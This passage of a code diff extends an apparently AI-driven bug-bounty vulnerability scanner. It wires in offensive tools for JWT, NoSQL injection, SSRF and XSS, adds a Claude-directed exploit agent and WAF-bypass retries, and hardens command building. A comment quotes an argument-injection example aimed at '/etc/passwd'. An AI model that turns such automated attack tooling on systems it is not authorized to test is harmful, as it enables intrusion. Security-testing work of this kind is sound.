@@ -52,6 +52,9 @@ import { tmpdir } from "os";
 import { join } from "path";
 import { programs } from "../db/schema";
 import { parameterDiscovery } from "../lib/tools/parameter-discovery";
+import { parseNucleiOutput } from "../lib/parsers/nuclei-parser";
+import { failurePrediction } from "../lib/intelligence/failure-prediction";
+import { effortScaler } from "../lib/intelligence/effort-scaling";
 import { oauthProber } from "../lib/tools/oauth-probe";
 import { massAssignmentProber } from "../lib/tools/mass-assignment-probe";
 import { businessLogicProber } from "../lib/tools/business-logic-probe";
@@ -60,6 +63,11 @@ import { jwtConfusionProber } from "../lib/tools/jwt-confusion-probe";
 import { techPayloadSelector } from "../lib/tools/tech-payload-selector";
 import { openRedirectChainProber } from "../lib/tools/open-redirect-chain-probe";
 import { blindXXEProber } from "../lib/tools/blind-xxe-probe";
+import { zapScanner } from "../lib/tools/zap-scanner";
+import { ReconRunner, ReconContext } from "../lib/recon/recon-runner";
+import { ClaudeClient } from "../lib/claude-client";
+import { synthesisAgent } from "./SynthesisAgent";
+import { logicExploitAgent } from "./LogicExploitAgent";
 
 const execFileAsync = promisify(execFile);
 
@@ -112,6 +120,8 @@ export interface Hypothesis {
   toolHint?: string;
   /** Which model generated this hypothesis — used to score model performance in RL store. */
   modelSource?: "claude" | "ollama" | "default";
+  /** Finding IDs this hypothesis chains from (set by SynthesisAgent). */
+  chainedFrom?: string[];
 }
 
 export interface ProbeResult {
@@ -122,6 +132,8 @@ export interface ProbeResult {
   parsed: Record<string, unknown>;
   success: boolean;
   duration: number;
+  rawHttpLog?: string;
+  videoPath?: string;
 }
 
 export interface HuntState {
@@ -144,6 +156,8 @@ export interface HypothesisConfirmed {
   severity: string;
   cvssScore: number;
   exploitPayload: string;
+  rawEvidence?: string;
+  videoPath?: string;
 }
 
 // ─── Tool Knowledge System ────────────────────────────────────────────────────
@@ -181,11 +195,16 @@ export const TOOL_KNOWLEDGE: Record<string, {
              "-json", "-silent", "-timeout", "10"],
     }),
     parser: (output) => {
-      const findings: unknown[] = [];
-      output.split("\n").filter(l => l.trim()).forEach(line => {
-        try { findings.push(JSON.parse(line)); } catch { /* skip non-JSON lines */ }
-      });
-      return { findings, count: findings.length };
+      const result = parseNucleiOutput(output);
+      return {
+        found: result.found,
+        count: result.count,
+        findings: result.matches,
+        confidence: result.confidence,
+        severity: result.highestSeverity,
+        flagValues: result.flagValues,
+        rawOutput: result.rawOutput,
+      };
     },
     rateLimit: 30,
   },
@@ -321,20 +340,16 @@ export const TOOL_KNOWLEDGE: Record<string, {
     rateLimit: 15,
   },
   jwt_tool: {
-    description: "JWT/auth vulnerability detection via nuclei",
-    vulnClasses: ["auth_bypass"],
+    description: "JWT security testing — alg:none, RS/HS confusion, key injection",
+    vulnClasses: ["auth_bypass", "jwt_confusion"],
     command: (url) => ({
-      bin: "nuclei",
-      args: ["-u", url, "-tags", "jwt,auth", "-severity", "medium,high,critical", "-json", "-silent", "-timeout", "15"],
+      bin: "jwt_tool",
+      args: ["-t", url, "-M", "at", "-np"],
     }),
     parser: (output) => {
-      const findings: unknown[] = [];
-      output.split("\n").filter(l => l.trim()).forEach(line => {
-        try { findings.push(JSON.parse(line)); } catch { /* skip */ }
-      });
-      const vulnerable = findings.length > 0;
-      const technique = findings.length > 0 ? JSON.stringify(findings[0]).slice(0, 100) : "";
-      return { vulnerable, found: vulnerable, technique, count: findings.length, rawOutput: output.slice(0, 600) };
+      const vulnerable = /EXPLOIT|Claim misuse|alg: none|RS256.*HS256|Key injection|\[CRITICAL\]/i.test(output);
+      const technique = output.match(/(alg: none|RS256.*HS256|[Kk]ey injection)/)?.[1] ?? "";
+      return { vulnerable, found: vulnerable, technique, rawOutput: output.slice(0, 600) };
     },
     rateLimit: 20,
   },
@@ -342,8 +357,8 @@ export const TOOL_KNOWLEDGE: Record<string, {
     description: "HTTP request smuggling detection (CL.TE and TE.CL)",
     vulnClasses: ["http_smuggling"],
     command: (url) => ({
-      bin: "python3",
-      args: ["/usr/local/bin/smuggler.py", "-u", url, "--no-color"],
+      bin: "smuggler",
+      args: ["-u", url, "--no-color"],
     }),
     parser: (output) => {
       const vulnerable = /Issue found|CL\.TE|TE\.CL|TE\.TE/i.test(output);
@@ -351,6 +366,62 @@ export const TOOL_KNOWLEDGE: Record<string, {
       return { vulnerable, type: vulnerable ? type : null, rawOutput: output.slice(0, 500) };
     },
     rateLimit: 60,
+  },
+  corsy: {
+    description: "CORS misconfiguration scanner — detects all known CORS bypasses",
+    vulnClasses: ["cors"],
+    command: (url) => ({
+      bin: "corsy",
+      args: ["-u", url, "-t", "10"],
+    }),
+    parser: (output) => {
+      const found = /CORS misconfiguration|\[FOUND\]|Origin reflection|Null origin|Wildcard/i.test(output);
+      const misconfigs = output.match(/\[FOUND\].+/gi) ?? [];
+      return { found, misconfigurations: misconfigs, count: misconfigs.length, rawOutput: output.slice(0, 500) };
+    },
+    rateLimit: 15,
+  },
+  nosqlmap: {
+    description: "NoSQL injection scanner for MongoDB and CouchDB",
+    vulnClasses: ["nosqli", "sqli"],
+    command: (url) => ({
+      bin: "nosqlmap",
+      args: ["-u", url, "--attack", "2", "--noInteractive"],
+    }),
+    parser: (output) => {
+      const injectable = /injection found|vulnerable|extracting data/i.test(output);
+      const dbms = output.match(/(?:MongoDB|CouchDB|Cassandra)/i)?.[0] ?? "unknown";
+      return { injectable, found: injectable, dbms, rawOutput: output.slice(0, 500) };
+    },
+    rateLimit: 60,
+  },
+  ssrfmap: {
+    description: "SSRF scanner and chaining exploiter",
+    vulnClasses: ["ssrf"],
+    command: (url) => ({
+      bin: "ssrfmap",
+      args: ["-u", url, "-p", "url", "--level", "2"],
+    }),
+    parser: (output) => {
+      const found = /SSRF|vulnerable|Request forgery|ssrf/i.test(output);
+      const param = output.match(/Vulnerable parameter: (.+)/i)?.[1];
+      return { found, param, rawOutput: output.slice(0, 500) };
+    },
+    rateLimit: 30,
+  },
+  xsser: {
+    description: "Automated XSS detection and exploitation framework",
+    vulnClasses: ["xss"],
+    command: (url) => ({
+      bin: "xsser",
+      args: ["--url", url, "--auto", "--silent"],
+    }),
+    parser: (output) => {
+      const found = /XSS FOUND|Total injections: [1-9]/i.test(output);
+      const count = parseInt(output.match(/Total injections: (\d+)/i)?.[1] ?? "0", 10);
+      return { found, count, rawOutput: output.slice(0, 600) };
+    },
+    rateLimit: 30,
   },
 };
 
@@ -367,9 +438,20 @@ let customToolsCache: typeof TOOL_KNOWLEDGE = {};
 const binaryCache = new Map<string, string | null>();
 function checkBinarySync(binary: string): string | null {
   if (binaryCache.has(binary)) return binaryCache.get(binary) ?? null;
+  // Only ever resolve plain binary names — reject anything with path separators
+  // or shell metacharacters so a malicious catalog/tool name can't reach a shell.
+  if (!/^[A-Za-z0-9._-]+$/.test(binary)) {
+    binaryCache.set(binary, null);
+    return null;
+  }
   try {
-    const { execSync } = require("child_process");
-    const path = execSync(`which ${binary} 2>/dev/null`, { encoding: "utf8", timeout: 2000 }).trim();
+    const { execFileSync } = require("child_process");
+    // execFile with an args array — no shell, stderr discarded via stdio.
+    const path = execFileSync("which", [binary], {
+      encoding: "utf8",
+      timeout: 2000,
+      stdio: ["ignore", "pipe", "ignore"],
+    }).trim();
     const result = path || null;
     binaryCache.set(binary, result);
     return result;
@@ -377,6 +459,38 @@ function checkBinarySync(binary: string): string | null {
     binaryCache.set(binary, null);
     return null;
   }
+}
+
+/**
+ * Build a { bin, args } command from a whitespace-delimited template, safely
+ * substituting {url} and {domain} placeholders.
+ *
+ * The template is tokenized FIRST, then placeholders are replaced within each
+ * token. This guarantees the URL stays a single argument even if it contains
+ * spaces — preventing argument injection (e.g. a URL like
+ * "http://x/ --output=/etc/passwd" can no longer add a flag to the tool).
+ * Returns null if the URL is not a safe http(s) URL.
+ */
+function buildCommandFromTemplate(
+  template: string,
+  url: string,
+): { bin: string; args: string[] } | null {
+  let safeUrl: string;
+  let domain: string;
+  try {
+    const u = new URL(url);
+    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
+    safeUrl = u.toString();
+    domain = u.hostname;
+  } catch {
+    return null;
+  }
+  const tokens = template.split(/\s+/).filter(Boolean);
+  if (tokens.length === 0) return null;
+  const substituted = tokens.map(tok =>
+    tok.replace(/\{url\}/g, safeUrl).replace(/\{domain\}/g, domain)
+  );
+  return { bin: substituted[0], args: substituted.slice(1) };
 }
 
 function makeCustomParser(parserType: string): (output: string) => Record<string, unknown> {
@@ -406,7 +520,11 @@ export class HunterEngine extends EventEmitter {
   private banCheckDone = false;
   private authHeaders: Record<string, string> = {};
   private authConfig: AuthConfig | null = null;
+  private secondaryAuthHeaders: Record<string, string> = {};
   private mergedTools: typeof TOOL_KNOWLEDGE = TOOL_KNOWLEDGE;
+  private reconContext: ReconContext | null = null;
+  private reconPromise: Promise<ReconContext | null> | null = null;
+  private reconObservationInjected = false;
 
   private async loadCustomTools(): Promise<void> {
     const now = Date.now();
@@ -426,9 +544,11 @@ export class HunterEngine extends EventEmitter {
           description: t.description,
           vulnClasses: (t.vulnClasses as string[]) || [],
           command: (url: string) => {
-            const domain = (() => { try { return new URL(url).hostname; } catch { return url; } })();
-            const parts = template.replace("{url}", url).replace("{domain}", domain).split(/\s+/).filter(Boolean);
-            return { bin: parts[0], args: parts.slice(1) };
+            const cmd = buildCommandFromTemplate(template, url);
+            // Reject unsafe/invalid URLs by yielding a no-op /bin/true invocation
+            // rather than firing the tool with attacker-influenced arguments.
+            if (!cmd) return { bin: "true", args: [] };
+            return cmd;
           },
           parser: makeCustomParser(t.parserType),
           rateLimit: t.rateLimit,
@@ -447,9 +567,9 @@ export class HunterEngine extends EventEmitter {
           description: entry.description,
           vulnClasses: entry.vulnClasses,
           command: (url: string) => {
-            const domain = (() => { try { return new URL(url).hostname; } catch { return url; } })();
-            const parts = template.replace("{url}", url).replace("{domain}", domain).split(/\s+/).filter(Boolean);
-            return { bin: parts[0], args: parts.slice(1) };
+            const cmd = buildCommandFromTemplate(template, url);
+            if (!cmd) return { bin: "true", args: [] };
+            return cmd;
           },
           parser: makeCustomParser(entry.parserType),
           rateLimit: entry.rateLimit,
@@ -481,6 +601,8 @@ export class HunterEngine extends EventEmitter {
     maxIterations?: number;
     budget?: Partial<HuntState["budget"]>;
     focusVulnClasses?: string[];
+    goal?: string;
+    secondaryAuthHeaders?: Record<string, string>;
   }): Promise<string> {
     await this.loadCustomTools();
 
@@ -517,6 +639,16 @@ export class HunterEngine extends EventEmitter {
     }).returning();
     this.dbSessionId = session.id;
 
+    // Register this session with the meta-reasoner so its decision journal,
+    // health evaluation, and strategy-weight learning actually fire. Without
+    // this, evaluateEnriched() aborts immediately and the learning loop never
+    // records a single entry for engine-driven hunts.
+    try {
+      metaReasoner.initializeHuntState(sessionUuid);
+    } catch (err) {
+      logger.debug("[HunterEngine] meta-reasoner init skipped (non-fatal)", { err: String(err) });
+    }
+
     // Pre-seed hypotheses from template focus classes if provided
     if (params.focusVulnClasses?.length) {
       for (const vc of params.focusVulnClasses) {
@@ -532,6 +664,14 @@ export class HunterEngine extends EventEmitter {
           createdAt: Date.now(),
         });
       }
+    }
+
+    // Store secondary auth for dual-context IDOR probes
+    if (params.secondaryAuthHeaders && Object.keys(params.secondaryAuthHeaders).length > 0) {
+      this.secondaryAuthHeaders = params.secondaryAuthHeaders;
+      logger.info("[HunterEngine] Secondary auth configured for dual-context IDOR", {
+        headerCount: Object.keys(params.secondaryAuthHeaders).length,
+      });
     }
 
     // Load auth config for this program and establish session if configured
@@ -553,6 +693,16 @@ export class HunterEngine extends EventEmitter {
       programId: params.programId,
       programType: "web_app",
     });
+
+    // Effort scaling — calibrate probe budget to target complexity before loop starts
+    const effort = effortScaler.analyze(params.targetUrl, params.goal ?? "");
+    if (this.state.budget.maxRequests === 200) {
+      // Only override if still at default — let explicit overrides win
+      this.state.budget.maxRequests = effort.probeLimit;
+    }
+    logger.info("[HunterEngine] Effort profile", { complexity: effort.complexity, probeLimit: effort.probeLimit, rationale: effort.rationale });
+    contextWriter.alert("effort", { complexity: effort.complexity, probeLimit: effort.probeLimit });
+
     contextWriter.reset(sessionUuid, params.targetUrl, "ollama");
     this.emit("hunt:started", { sessionUuid, targetUrl: params.targetUrl });
     logger.info("Hunt started", { sessionUuid, targetUrl: params.targetUrl });
@@ -562,6 +712,16 @@ export class HunterEngine extends EventEmitter {
       const domain = new URL(params.targetUrl).hostname;
       await stealthCoordinator.runWarmup(domain, 'generic', false, params.programId);
     } catch { /* non-critical — target may not be reachable yet */ }
+
+    // Phase 0: passive OSINT recon — runs concurrently with first observe()
+    // Resolves before hypothesize() is called so the model reasons over real attack surface.
+    this.reconPromise = new ReconRunner(params.targetUrl, sessionUuid, (e, d) => this.emit(e, d))
+      .run()
+      .then(ctx => { this.reconContext = ctx; return ctx; })
+      .catch(err => {
+        logger.warn("[HunterEngine] Recon runner failed (non-critical)", { err: String(err) });
+        return null;
+      });
 
     // Run the main loop asynchronously
     this.runLoop().catch(err => {
@@ -600,6 +760,7 @@ export class HunterEngine extends EventEmitter {
         hypothesesCount: this.state.hypotheses.length,
         findingsCount: this.state.confirmedFindings.length,
       });
+      contextWriter.alert("phase", { phase: this.state.phase, iteration: this.state.iteration });
 
       try {
         switch (this.state.phase) {
@@ -629,44 +790,67 @@ export class HunterEngine extends EventEmitter {
             break;
         }
       } catch (err) {
+        const msg = err instanceof Error ? err.message : String(err);
         logger.error("Hunt phase error", { phase: this.state.phase, err });
+        contextWriter.alert("error", { phase: this.state.phase, iteration: this.state.iteration, msg: msg.slice(0, 200) });
       }
 
-      // Every 3 iterations check hunt health and trigger meta-reasoner pivot if degraded
+      // Feed live progress into the meta-reasoner so its decision journal and
+      // health evaluation carry real findings/confidence signal each iteration.
+      try {
+        const avgConfidence = this.state.hypotheses.length > 0
+          ? this.state.hypotheses.reduce((s, h) => s + h.confidence, 0) / this.state.hypotheses.length
+          : 0.5;
+        metaReasoner.syncHuntProgress(this.state.sessionId, {
+          findingsCount: this.state.confirmedFindings.length,
+          confidence: avgConfidence,
+        });
+      } catch { /* non-fatal */ }
+
+      // Every 3 iterations run a meta-reasoner evaluation. This is called
+      // unconditionally (not only when degraded) so the decision journal records
+      // an entry each cycle — the strategy-weight learner needs that data to
+      // close the cross-hunt learning loop. The pivot action is still gated on
+      // the meta-reasoner's own decision.
       if (this.state.iteration % 3 === 0) {
         try {
           const health = huntCortex.computeHuntHealth(this.state.sessionId);
-          if (health.health < 0.4) {
-            const decision = await metaReasoner.evaluateEnriched(this.state.sessionId);
-            if (decision.action === 'pivot') {
-              const paths = backwardPlanner.getOptimalPath(this.state.phase, undefined, undefined);
-              const pivotHypotheses = paths.slice(0, 2).map(p => ({
-                id: uuidv4(),
-                vulnClass: p.path.vulnerability,
-                targetUrl: this.state.targetUrl,
-                reasoning: `Meta-reasoner pivot (health=${health.health.toFixed(2)}): ${p.path.goal}`,
-                confidence: Math.min(0.85, p.adjustedLikelihood),
-                priority: Math.min(10, Math.round(p.path.priority)),
-                evidence: [],
-                status: 'pending' as const,
-                createdAt: Date.now(),
-              }));
-              this.state.hypotheses.push(...pivotHypotheses);
-              if (this.state.hypotheses.length > MAX_HYPOTHESES) {
-                this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
-                this.state.hypotheses.splice(MAX_HYPOTHESES);
-              }
-              this.state.phase = 'probe';
-              this.emit('hunt:pivot', { sessionId: this.state.sessionId, reason: decision.rationale, newHypotheses: pivotHypotheses.length });
-              logger.info('[HunterEngine] Strategy pivot injected', { health: health.health, paths: pivotHypotheses.length, rationale: decision.rationale });
+          const decision = await metaReasoner.evaluateEnriched(this.state.sessionId);
+          if (decision.action === 'pivot') {
+            const paths = backwardPlanner.getOptimalPath(this.state.phase, undefined, undefined);
+            const pivotHypotheses = paths.slice(0, 2).map(p => ({
+              id: uuidv4(),
+              vulnClass: p.path.vulnerability,
+              targetUrl: this.state.targetUrl,
+              reasoning: `Meta-reasoner pivot (health=${health.health.toFixed(2)}): ${p.path.goal}`,
+              confidence: Math.min(0.85, p.adjustedLikelihood),
+              priority: Math.min(10, Math.round(p.path.priority)),
+              evidence: [],
+              status: 'pending' as const,
+              createdAt: Date.now(),
+            }));
+            this.state.hypotheses.push(...pivotHypotheses);
+            if (this.state.hypotheses.length > MAX_HYPOTHESES) {
+              this.state.hypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
+              this.state.hypotheses.splice(MAX_HYPOTHESES);
             }
+            this.state.phase = 'probe';
+            this.emit('hunt:pivot', { sessionId: this.state.sessionId, reason: decision.rationale, newHypotheses: pivotHypotheses.length });
+            logger.info('[HunterEngine] Strategy pivot injected', { health: health.health, paths: pivotHypotheses.length, rationale: decision.rationale });
           }
         } catch { /* non-critical — health check failure must not stop the hunt */ }
       }
     }
 
     this.state.phase = "complete";
+    contextWriter.updateState({ phase: "complete", findingsCount: this.state.confirmedFindings.length });
+    contextWriter.alert("complete", {
+      findings: this.state.confirmedFindings.length,
+      iterations: this.state.iteration,
+      probes: this.state.probes.length,
+    });
     observationCompressor.clearSession(this.state.sessionId);
+    ClaudeClient.clearSession(this.state.sessionId);
     // Release the authenticated session so credentials/cookies aren't held after the hunt.
     if (this.authConfig) {
       sessionManager.invalidate(this.state.programId);
@@ -755,6 +939,37 @@ export class HunterEngine extends EventEmitter {
     while (this.state.observations.length > MAX_OBSERVATIONS) this.state.observations.shift();
 
     this.emit("hunt:observations", { count: obs.length, observations: obs });
+
+    // Inject Phase 0 recon as a structured observation (once, when recon is available)
+    if (this.reconContext && !this.reconObservationInjected) {
+      this.reconObservationInjected = true;
+      const alive = this.reconContext.subdomains.filter(s => s.alive);
+      const reconObs: Observation = {
+        id: uuidv4(),
+        timestamp: Date.now(),
+        source: "recon_runner",
+        data: {
+          subdomainsDiscovered: this.reconContext.subdomains.length,
+          aliveSubdomains: alive.map(s => s.subdomain),
+          interestingHistoricalUrls: this.reconContext.interestingUrls.slice(0, 20),
+          historicalPathCount: this.reconContext.historicalPathCount,
+        },
+        anomalyScore: this.reconContext.interestingUrls.length > 5 ? 0.8 : 0.4,
+        tags: ["recon", "subdomains", "wayback", "osint", "attack_surface"],
+      };
+      this.state.observations.push(reconObs);
+      this.emit("hunt:observations", { count: 1, observations: [reconObs] });
+      logger.info("[HunterEngine] Phase 0 recon observation injected", {
+        subdomains: this.reconContext.subdomains.length,
+        aliveSubdomains: alive.length,
+        interestingUrls: this.reconContext.interestingUrls.length,
+      });
+    }
+
+    // Vision observation — screenshot the target and describe the UI (first pass only, fire-and-forget)
+    if (this.state.iteration === 1) {
+      this.runVisionObservation().catch(() => {});
+    }
 
     // CVE-seeded hypothesis injection — first observe pass only
     if (this.state.iteration === 1) {
@@ -929,14 +1144,28 @@ export class HunterEngine extends EventEmitter {
         } catch (err) { logger.debug("[HunterEngine] Cookie flag check skipped", { err: String(err) }); }
       })(),
 
-      // JS/SPA crawling — extract hidden API endpoints from JS bundles
+      // JS/SPA crawling — extract hidden API endpoints + visual event tags
       (async () => {
         try {
           const crawlResult = await deepCrawl(this.state.targetUrl, { maxDepth: 2, maxPages: 20, authHeaders: this.authHeaders });
           for (const hyp of crawlResult.hypotheses) {
             this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.targetUrl || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [], status: "pending", createdAt: Date.now() });
           }
-          if (crawlResult.endpointsFound.length > 0) this.emit("hunt:endpoints_discovered", { sessionId: this.state.sessionId, count: crawlResult.endpointsFound.length, endpoints: crawlResult.endpointsFound.slice(0, 10).map(e => e.url), pagesVisited: crawlResult.pagesVisited });
+          if (crawlResult.endpointsFound.length > 0) {
+            this.emit("hunt:endpoints_discovered", { sessionId: this.state.sessionId, count: crawlResult.endpointsFound.length, endpoints: crawlResult.endpointsFound.slice(0, 10).map(e => e.url), pagesVisited: crawlResult.pagesVisited });
+          }
+          if (crawlResult.visualTags.length > 0) {
+            // Inject visual tags as an observation so the model can reason over them
+            this.state.observations.push({
+              id: uuidv4(),
+              source: "visual_observer",
+              data: { tags: crawlResult.visualTags, count: crawlResult.visualTags.length },
+              tags: ["visual", "dom", "browser"],
+              anomalyScore: crawlResult.visualTags.some(t => t.startsWith("[DIALOG") || /SQL|stack.trace|JS_ERR/i.test(t)) ? 0.8 : 0.3,
+              timestamp: Date.now(),
+            });
+            this.emit("hunt:visual_tags", { sessionId: this.state.sessionId, count: crawlResult.visualTags.length, tags: crawlResult.visualTags.slice(0, 20) });
+          }
         } catch (err) { logger.debug("[HunterEngine] JS/SPA crawl skipped", { err: String(err) }); }
       })(),
 
@@ -1133,7 +1362,51 @@ export class HunterEngine extends EventEmitter {
             this.emit("hunt:xxe_found", { sessionId: this.state.sessionId, count: xxeResult.vulns.length, oobConfirmed: xxeResult.vulns.some(v => v.oobReceived) });
           }
         } catch (err) { logger.debug("[HunterEngine] Blind XXE probe skipped", { err: String(err) }); }
-      }),
+      })(),
+
+      // ZAP passive scanner — spider the target and surface passive-scan findings
+      (async () => {
+        try {
+          const zapResult = await zapScanner.scan(this.state.targetUrl, this.authHeaders);
+          if (!zapResult.available) return;
+
+          for (const hyp of zapResult.hypotheses) {
+            this.state.hypotheses.push({
+              id: uuidv4(),
+              vulnClass: hyp.vulnClass,
+              targetUrl: hyp.targetUrl,
+              reasoning: hyp.reasoning,
+              confidence: hyp.confidence,
+              priority: hyp.priority,
+              evidence: hyp.evidence ? [{ id: uuidv4(), source: "zap", data: { raw: hyp.evidence, parameter: hyp.parameter, cweId: hyp.cweId }, tags: [hyp.vulnClass, "zap"], anomalyScore: hyp.confidence, timestamp: Date.now() }] : [],
+              status: "pending",
+              createdAt: Date.now(),
+            });
+          }
+
+          // Surface newly discovered endpoints as observations
+          if (zapResult.endpointsDiscovered.length > 0) {
+            this.state.observations.push({
+              id: uuidv4(),
+              source: "zap_spider",
+              data: { endpoints: zapResult.endpointsDiscovered, count: zapResult.endpointsDiscovered.length },
+              tags: ["endpoints", "zap"],
+              anomalyScore: 0.3,
+              timestamp: Date.now(),
+            });
+          }
+
+          if (zapResult.hypotheses.length > 0 || zapResult.endpointsDiscovered.length > 0) {
+            this.emit("hunt:zap_scan", {
+              sessionId: this.state.sessionId,
+              alertCount: zapResult.alertCount,
+              hypothesesSeeded: zapResult.hypotheses.length,
+              endpointsDiscovered: zapResult.endpointsDiscovered.length,
+              duration: zapResult.duration,
+            });
+          }
+        } catch (err) { logger.debug("[HunterEngine] ZAP scan skipped (non-critical)", { err: String(err) }); }
+      })(),
       ]);
     }
   }
@@ -1287,6 +1560,14 @@ export class HunterEngine extends EventEmitter {
       }
     }
 
+    // Wait for Phase 0 recon (best-effort — won't block past 8s if still running)
+    if (this.reconPromise && !this.reconContext) {
+      await Promise.race([
+        this.reconPromise,
+        new Promise(resolve => setTimeout(resolve, 8000)),
+      ]).catch(() => {});
+    }
+
     // ── RAG: promptKB methodology hints ──────────────────────────────────────
     // Inject structured attack objectives from the KB for observed candidate
     // vuln classes so the model knows the expected exploitation approach.
@@ -1324,7 +1605,7 @@ Orchestration context:
 ${chainTemplate.split('\n').slice(0, 8).join('\n')}
 
 ${toolKnowledge.getSummaryBlock()}
-${domainKnowledge ? `\nRelevant domain knowledge and past examples:\n${domainKnowledge}\n` : ''}${rlPriorityHint ? `\nCross-hunt intelligence: ${rlPriorityHint}\n` : ''}${methodologyHints ? `\nAttack methodology for observed candidates:\n${methodologyHints}` : ''}
+${domainKnowledge ? `\nRelevant domain knowledge and past examples:\n${domainKnowledge}\n` : ''}${rlPriorityHint ? `\nCross-hunt intelligence: ${rlPriorityHint}\n` : ''}${methodologyHints ? `\nAttack methodology for observed candidates:\n${methodologyHints}` : ''}${this.reconContext ? `\n\nPre-hunt OSINT recon (use this to make targetUrl fields specific — probe discovered subdomains and historical paths):\n${this.reconContext.summary}\n` : ''}
 Generate 3-5 specific vulnerability hypotheses based on the observations.
 Each hypothesis must have:
 - vulnClass: (xss/sqli/ssrf/idor/lfi/rce/auth_bypass/info_disclosure/misconfig/open_redirect/cors/csrf/xxe)
@@ -1349,7 +1630,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
 
     const _aiReasoningStart = Date.now();
     try {
-      const response = await this.modelRouter.reason(prompt);
+      const response = await this.modelRouter.reason(prompt, this.state.sessionId);
       const _aiReasoningMs = Date.now() - _aiReasoningStart;
       // Yield after model response so the event loop can process other callbacks
       // before the synchronous JSON.parse (which can be slow for large responses).
@@ -1439,6 +1720,16 @@ Return ONLY valid JSON array of hypothesis objects.`;
         break;
       }
 
+      // Failure prediction — skip low-probability probes early to preserve budget
+      const evidenceTags = hypothesis.evidence.flatMap(e => e.tags ?? []);
+      const complexity = failurePrediction.complexityFrom(evidenceTags, hypothesis.reasoning);
+      const prediction = failurePrediction.predict(hypothesis.vulnClass, complexity);
+      if (prediction.shouldSkip) {
+        hypothesis.status = "rejected";
+        logger.debug("[HunterEngine] Failure prediction skip", { vulnClass: hypothesis.vulnClass, reason: prediction.reason });
+        continue;
+      }
+
       hypothesis.status = "probing";
       this.emit("hunt:probing", { hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass });
 
@@ -1449,8 +1740,75 @@ Return ONLY valid JSON array of hypothesis objects.`;
         continue;
       }
 
-      // Select appropriate tool — honour retry hint if set, otherwise auto-select
-      const toolName = hypothesis.toolHint || this.selectTool(hypothesis.vulnClass);
+      // Deserialization POST probe — fires before regular tool dispatch for rce hypotheses
+      if (hypothesis.vulnClass === "rce" || hypothesis.vulnClass === "deserialization") {
+        const deserialResult = await this.probeDeserialize(hypothesis.targetUrl);
+        if (deserialResult.found) {
+          const result: ProbeResult = {
+            hypothesisId: hypothesis.id,
+            tool: "deserialize_probe",
+            command: `POST ${deserialResult.endpoint}`,
+            output: deserialResult.output,
+            parsed: { found: true, vulnerable: true, rawOutput: deserialResult.output, flagValues: deserialResult.flagValues },
+            success: true,
+            duration: deserialResult.duration,
+          };
+          this.state.probes.push(result);
+          this.state.budget.requestsMade++;
+          this.rlWiring.onToolResult("deserialize_probe", hypothesis.vulnClass, true, hypothesis.confidence);
+          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, true);
+          this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "direct" });
+          // Jump straight to update — hypothesis handled
+          hypothesis.status = "pending"; // let update phase confirm it
+          hypothesis.confidence = Math.min(0.95, hypothesis.confidence + 0.3);
+          (hypothesis as unknown as Record<string, unknown>)._deserialProbeHit = true;
+          (hypothesis as unknown as Record<string, unknown>)._deserialOutput = deserialResult.output;
+          continue;
+        }
+      }
+
+      // LogicExploitAgent — Claude-directed Playwright for stateful/chained probes
+      if (
+        ["business_logic", "idor", "auth_bypass"].includes(hypothesis.vulnClass) &&
+        ClaudeClient.isAvailable()
+      ) {
+        try {
+          const logicResult = await logicExploitAgent.probe(
+            hypothesis,
+            this.state.sessionId,
+            this.authHeaders,
+            Object.keys(this.secondaryAuthHeaders).length > 0 ? this.secondaryAuthHeaders : undefined,
+          );
+          const result: ProbeResult = {
+            hypothesisId: hypothesis.id,
+            tool: "logic_exploit_agent",
+            command: `claude-sonnet:${hypothesis.vulnClass}`,
+            output: logicResult.evidence || logicResult.rawHttpLog || "No evidence collected",
+            parsed: {
+              found: logicResult.confirmed,
+              payload: logicResult.payload,
+              rawOutput: logicResult.evidence,
+            },
+            success: logicResult.confirmed,
+            duration: logicResult.duration,
+            rawHttpLog: logicResult.rawHttpLog,
+            videoPath: logicResult.videoPath,
+          };
+          this.state.probes.push(result);
+          this.state.budget.requestsMade++;
+          this.rlWiring.onToolResult("logic_exploit_agent", hypothesis.vulnClass, logicResult.confirmed, hypothesis.confidence);
+          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, logicResult.confirmed);
+          this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "logic_agent" });
+          if (!logicResult.confirmed) hypothesis.status = "inconclusive";
+          continue;
+        } catch (err) {
+          logger.warn("[HunterEngine] LogicExploitAgent error — falling through to standard tool", { err: String(err) });
+        }
+      }
+
+      // Select appropriate tool — honour retry hint if set, otherwise let the
+      // RL store pick the best-performing tool for this vuln class.
+      const toolName = hypothesis.toolHint || await this.selectToolRL(hypothesis.vulnClass);
       delete hypothesis.toolHint;
 
       // On gray-zone retries (retryCount > 0), inject WAF-bypass payload mutations
@@ -1488,6 +1846,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
       if (this.state.probes.length > MAX_PROBES) this.state.probes.shift();
       this.state.budget.requestsMade += Number(probeResult.requestsMade || 1);
       this.rlWiring.onToolResult(toolName, hypothesis.vulnClass, result.success, hypothesis.confidence);
+      failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, result.success);
       const proxyId = egressAllocator.getCurrentAssignment(hypothesis.targetUrl) ?? 'direct';
       this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId });
 
@@ -1545,6 +1904,17 @@ Return ONLY valid JSON array of hypothesis objects.`;
           hypothesis.status = "confirmed";
           this.rlWiring.onHypothesisOutcome(hypothesis.vulnClass, hypothesis.confidence, true);
           this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, true);
+          // Credit the chain synthesis if this hypothesis was born from one.
+          // Without this, the RL only sees the closing tool and never learns that
+          // the synthesis pass that found the opening was the load-bearing step.
+          if (hypothesis.chainedFrom?.length) {
+            this.rlWiring.onToolResult("chain_synthesis", hypothesis.vulnClass, true, hypothesis.confidence);
+            this.emit("hunt:chain_credited", {
+              hypothesisId: hypothesis.id,
+              vulnClass: hypothesis.vulnClass,
